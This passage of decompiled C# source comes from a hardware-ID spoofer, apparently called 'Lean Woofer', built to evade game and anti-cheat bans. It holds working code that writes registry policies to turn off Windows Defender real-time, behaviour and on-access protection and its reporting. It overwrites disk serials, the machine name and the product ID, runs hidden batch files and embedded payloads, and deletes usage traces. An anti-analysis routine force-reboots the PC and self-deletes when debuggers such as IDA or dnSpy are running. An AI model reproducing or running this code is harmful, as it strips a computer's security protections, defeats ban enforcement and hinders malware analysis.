			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", throwOnMissingSubKey: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			HWIDclick();
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("echo off");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("taskkill /f /im Steam.exe /t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
				streamWriter.WriteLine("cls");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Spoofed Windows Info!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		public static string RandomId(int length)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			string text2 = "";
			Random random = new Random();
			for (int i = 0; i < length; i++)
			{
				text2 += text[random.Next(text.Length)];
			}
			return text2;
		}

		public static void Disk()
		{
			string[] subKeyNames = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames();
			foreach (string text in subKeyNames)
			{
				string[] subKeyNames2 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames();
				foreach (string text2 in subKeyNames2)
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text + "\\" + text2 + "\\Target Id 0\\Logical Unit Id 0", writable: true);
					if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
					{
						string value = "XB0L95MV9YE3IR";
						string value2 = "XB0L95MV9YE3IR";
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue("Identifier", value);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(value));
						registryKey.SetValue("SerialNumber", value2);
					}
				}
			}
			string[] subKeyNames3 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames();
			foreach (string text3 in subKeyNames3)
			{
				Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + text3, writable: true).SetValue("Identifier", "XB0L95MV" + "-" + "XB0L95MV" + "-A");
			}
		}

		private void ak(object sender, EventArgs e)
		{
			Disk();
			MessageBox.Show("Spoofed Disk!", "Lean Woofer", MessageBoxButtons.OK);
		}

		public static string GenerateString(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "ABCDEF0123456789"[random.Next("ABCDEF0123456789".Length)];
			}
			return new string(array);
		}

		private void al(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = File.ReadAllBytes("033856");
			File.WriteAllBytes(tempPath + this.m_c + ".bat", bytes);
			File.SetAttributes(tempPath + this.m_c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath + this.m_c + ".bat");
			Thread.Sleep(2500);
			xynwbyzia();
			MessageBox.Show("Spoofed Xbox!", "Lean Woofer", MessageBoxButtons.OK);
		}

		public static bool SetMachineName(string newName)
		{
			RegistryKey localMachine = Registry.LocalMachine;
			string subkey = "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName";
			RegistryKey registryKey = localMachine.CreateSubKey(subkey);
			registryKey.SetValue("ComputerName", newName);
			registryKey.Close();
			string subkey2 = "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName";
			RegistryKey registryKey2 = localMachine.CreateSubKey(subkey2);
			registryKey2.SetValue("ComputerName", newName);
			registryKey2.Close();
			string subkey3 = "SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\";
			RegistryKey registryKey3 = localMachine.CreateSubKey(subkey3);
			registryKey3.SetValue("Hostname", newName);
			registryKey3.SetValue("NV Hostname", newName);
			registryKey3.Close();
			return true;
		}

		public static void SpoofPCName()
		{
		}

		private void am(object sender, EventArgs e)
		{
			SetMachineName("956F3A");
			DialogResult dialogResult = MessageBox.Show("Name Spoofed, Do you want to restart your PC Now?", "Lean Woofer", MessageBoxButtons.YesNo);
			if (dialogResult == DialogResult.Yes)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
			}
		}

		private static void an()
		{
			try
			{
				Process process = new Process();
				process.StartInfo.Arguments = "netsh advfirewall firewall delete rule name = fivem_b2545_gtaprocess.exe";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				process.WaitForExit();
				MessageBox.Show("Enabled");
			}
			catch
			{
				MessageBox.Show("There was an error, try again later", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void ao(object sender, EventArgs e)
		{
			string value = "F52CD" + "-" + "0F5E1" + "-" + "B73F8" + "-" + "1B935";
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
			MessageBox.Show("PrID Changed To: " + CurrentProductID(), "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		public static string CurrentProductID()
		{
			string text = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
			string text2 = "ProductID";
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey(text);
			if (registryKey2 == null)
			{
				throw new KeyNotFoundException($"Key Not Found: {text}");
			}
			object value = registryKey2.GetValue(text2);
			if (value == null)
			{
				throw new IndexOutOfRangeException($"Index Not Found: {text2}");
			}
			return value.ToString();
		}

		private void ap(object sender, EventArgs e)
		{
		}

		private void aq(object sender, PaintEventArgs e)
		{
		}

		private void ar(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/unban");
		}

		private void @as(object sender, EventArgs e)
		{
		}

		public static void InstallDate()
		{
			string value = "1187b19b";
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: true);
			registryKey.SetValue("InstallDate", value);
		}

		private void at(object sender, EventArgs e)
		{
			InstallDate();
			MessageBox.Show("Spoofed Last Logs ", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private static void au()
		{
			Process[] processesByName = Process.GetProcessesByName("dnSpy");
			if (processesByName.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName2 = Process.GetProcessesByName("ida64");
			if (processesByName2.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName3 = Process.GetProcessesByName("64dbg");
			if (processesByName3.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName4 = Process.GetProcessesByName("ollydbg");
			if (processesByName4.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName5 = Process.GetProcessesByName("x32dbg");
			if (processesByName5.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName6 = Process.GetProcessesByName("MasterDumper");
			if (processesByName6.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
		}

		private void av(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text = this.m_bm.Text;
			string path = "C:\\Program Files\\Unlisted";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				string text2 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine("Volumeid.exe " + text + ": " + "1857" + "-" + "8481" + " -nobanner");
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.m_d.Add(process);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
				return;
			}
			byte[] bytes = File.ReadAllBytes("558460");
			File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", bytes);
			File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
			Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
			Thread.Sleep(500);
			string text3 = "C:\\Program Files\\Unlisted\\change.bat";
			using (StreamWriter streamWriter2 = File.CreateText(text3))
			{
				streamWriter2.WriteLine("Volumeid.exe " + text + ": " + "7494" + "-" + "9649" + " -nobanner");
			}
			Process process2 = new Process();
			process2.StartInfo.FileName = text3;
			this.m_d.Add(process2);
			File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
			process2.Start();
			MessageBox.Show("Spoofed NVME Disk!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			Directory.Delete(path);
		}

		private void aw(object sender, PaintEventArgs e)
		{
		}

		private void ax(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = File.ReadAllBytes("918086");
			File.WriteAllBytes(tempPath + this.m_c + ".bat", bytes);
			File.SetAttributes(tempPath + this.m_c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath + this.m_c + ".bat");
			Thread.Sleep(2500);
			xynwbyzia();
			MessageBox.Show("Unlinked All Services!", "Lean Woofer Premium", MessageBoxButtons.OK);
		}

		private void ay(object sender, EventArgs e)
		{
			string[] subKeyNames = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames();
			foreach (string text in subKeyNames)
			{
				string[] subKeyNames2 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames();
				foreach (string text2 in subKeyNames2)
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text + "\\" + text2 + "\\Target Id 0\\Logical Unit Id 0", writable: true);
					if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
					{
						string value = "XB0L95MV9YE3IR";
						string value2 = "XB0L95MV9YE3IR";
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue("Identifier", value);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(value));
						registryKey.SetValue("SerialNumber", value2);
					}
				}
			}
			string[] subKeyNames3 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames();
			foreach (string text3 in subKeyNames3)
			{
				Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + text3, writable: true).SetValue("Identifier", "XB0L95MV" + "-" + "XB0L95MV" + "-A");
			}
			MessageBox.Show("Spoofed Nvme Disk!", "Lean Woofer", MessageBoxButtons.OK);
		}

		private void az(object sender, EventArgs e)
		{
			NetWoof();
			Thread.Sleep(2500);
			MessageBox.Show("Spoofed Local netCache!", "Lean Woofer", MessageBoxButtons.OK);
		}

		private void ba(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = File.ReadAllBytes("811372");
			File.WriteAllBytes(tempPath + this.m_c + ".bat", bytes);
			Process.Start(tempPath + this.m_c + ".bat");
			Thread.Sleep(2500);
			xynwbyzia();
			NetWoof();
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text = this.m_bm.Text;
			string path = "C:\\Program Files\\Unlisted";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				string text2 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine("Volumeid.exe " + text + ": " + "2651" + "-" + "1447" + " -nobanner");
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.m_d.Add(process);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			else
			{
				byte[] bytes2 = File.ReadAllBytes("558460");
				File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", bytes2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
				Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
				Thread.Sleep(500);
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine("Volumeid.exe " + text + ": " + "5857" + "-" + "7129" + " -nobanner");
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.m_d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			HWIDclick();
			string tempPath2 = Path.GetTempPath();
			byte[] bytes3 = File.ReadAllBytes("061044");
			File.WriteAllBytes(tempPath2 + this.m_c + ".bat", bytes3);
			File.SetAttributes(tempPath2 + this.m_c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath2 + this.m_c + ".bat");
			Thread.Sleep(2500);
			xynwbyzia();
			string path2 = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text4 = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter3 = File.CreateText(text4))
				{
					streamWriter3.WriteLine("netsh int ip reset");
				}
				Process process3 = new Process();
				process3.StartInfo.FileName = text4;
				this.m_d.Add(process3);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process3.Start();
			}
			HWIDclick();
			XBOXclick();
			PCclick();
			Diskclick();
			FiveM();
			bi();
			Thread.Sleep(2000);
			MessageBox.Show("Spoofed FiveM Server Bans, Use new steam, rockstar and unlink discord (might need a vpn)", "Lean Woofer Premium", MessageBoxButtons.OK);
		}

		private void bb(object sender, EventArgs e)
		{
			this.m_ba.BringToFront();
		}

		private void bc(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Program Files\\leanuser.txt"))
			{
				File.Delete("C:\\Program Files\\leanuser.txt");
			}
			if (File.Exists("C:\\Program Files\\leanpass.txt"))
			{
				File.Delete("C:\\Program Files\\leanpass.txt");
			}
			MessageBox.Show("Deleted Saved Logins!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		private void bd(object sender, EventArgs e)
		{
			this.m_ba.BringToFront();
		}

		private void be(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = File.ReadAllBytes("203677");
			File.WriteAllBytes(tempPath + this.m_c + ".bat", bytes);
			File.SetAttributes(tempPath + this.m_c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath + this.m_c + ".bat");
			Thread.Sleep(2500);
			xynwbyzia();
			MessageBox.Show("Spoofed EAC!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void bf(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = File.ReadAllBytes("061044");
			File.WriteAllBytes(tempPath + this.m_c + ".bat", bytes);
			File.SetAttributes(tempPath + this.m_c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath + this.m_c + ".bat");
			Thread.Sleep(2500);
			xynwbyzia();
			MessageBox.Show("Boosted Your System!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void bg(object sender, EventArgs e)
		{
		}

		private void bh(object sender, EventArgs e)
		{
		}

		public static void NetWoof()
		{
			List<Process> list = new List<Process>();
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
